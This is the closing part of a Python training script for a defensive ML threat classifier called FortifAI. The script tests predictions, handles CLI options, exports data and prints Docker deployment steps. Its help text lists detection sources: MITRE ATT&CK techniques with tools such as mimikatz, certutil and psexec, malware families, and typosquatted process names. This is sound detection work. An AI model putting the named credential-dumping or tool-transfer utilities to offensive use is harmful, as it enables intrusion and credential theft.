    print("\nTest Results:")
    print("-" * 80)
    
    correct = 0
    for test in test_cases:
        features = extract_features(test)
        X = pd.DataFrame([features])
        X_scaled = scaler.transform(X)
        
        pred = rf.predict(X_scaled)[0]
        proba = rf.predict_proba(X_scaled)[0]
        label = le.inverse_transform([pred])[0]
        confidence = max(proba)
        
        is_threat_pred = label != 'normal'
        is_threat_expected = test['expected'] == 'threat'
        
        if is_threat_pred == is_threat_expected:
            status = "✓"
            correct += 1
        else:
            status = "✗"
        
        print(f"{status} {test['name']:<30} → {label:<20} ({confidence:.1%})")
    
    print("-" * 80)
    print(f"Accuracy: {correct}/{len(test_cases)} ({100*correct/len(test_cases):.0f}%)")


def main():
    parser = argparse.ArgumentParser(description='FortifAI Hybrid ML Training')
    parser.add_argument('--train', action='store_true', help='Train models')
    parser.add_argument('--samples', type=int, default=20000, help='Number of samples')
    parser.add_argument('--custom-data', type=str, help='Path to custom labeled CSV')
    parser.add_argument('--export-data', action='store_true', help='Export training data')
    parser.add_argument('--test', action='store_true', help='Test model')
    
    args = parser.parse_args()
    
    if args.train or args.export_data:
        # Load custom data if provided
        custom_df = None
        if args.custom_data and os.path.exists(args.custom_data):
            print(f"Loading custom data from {args.custom_data}...")
            custom_df = pd.read_csv(args.custom_data)
        
        # Generate data
        generator = HybridTrainingDataGenerator()
        df = generator.generate_dataset(args.samples, custom_df)
        
        # Export data
        DATA_DIR.mkdir(parents=True, exist_ok=True)
        data_file = DATA_DIR / f'hybrid_training_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'
        df.to_csv(data_file, index=False)
        print(f"\n✓ Training data exported to {data_file}")
        
        if args.train:
            train_models(df, OUTPUT_DIR)
            test_model(OUTPUT_DIR)
            
            print(f"\n{'='*60}")
            print("NEXT STEPS")
            print(f"{'='*60}")
            print("1. Copy models to Docker container:")
            print("   docker cp ml-models/threat-classification/trained/. fortifai-ml:/app/models/trained/")
            print("\n2. Or train inside container (recommended):")
            print("   docker cp scripts/train_hybrid.py fortifai-ml:/app/")
            print("   docker exec fortifai-ml python /app/train_hybrid.py --train")
            print("\n3. Restart ML engine:")
            print("   docker-compose restart ml-engine")
    
    elif args.test:
        test_model(OUTPUT_DIR)
    
    else:
        parser.print_help()
        print(f"\n{'='*60}")
        print("DATA SOURCES")
        print(f"{'='*60}")
        print(f"""
This hybrid training uses:

1. MITRE ATT&CK Framework
   - T1003: Credential Dumping (mimikatz, procdump, etc.)
   - T1059: Malicious Scripts (encoded PowerShell)
   - T1021: Lateral Movement (psexec, wmiexec)
   - T1548: Privilege Escalation (JuicyPotato, PrintSpoofer)
   - T1105: Tool Transfer (certutil, bitsadmin)
   - T1087: Reconnaissance (BloodHound, ADRecon)

2. Known Malware Families
   - Trojans: Emotet, TrickBot, QBot, IcedID
   - RATs: NjRAT, AsyncRAT, Remcos, Agent Tesla
   - Ransomware: Ryuk, Conti, LockBit, REvil
   - Miners: XMRig, CGMiner

3. Typosquatting Detection
   - svchosts.exe, scvhost.exe (fake svchost)
   - csrs.exe, csrss32.exe (fake csrss)
   - explore.exe (fake explorer)

4. Legitimate Process Whitelist
   - 150+ known-good Windows processes
   - Development tools, browsers, etc.
""")


if __name__ == '__main__':
    main()
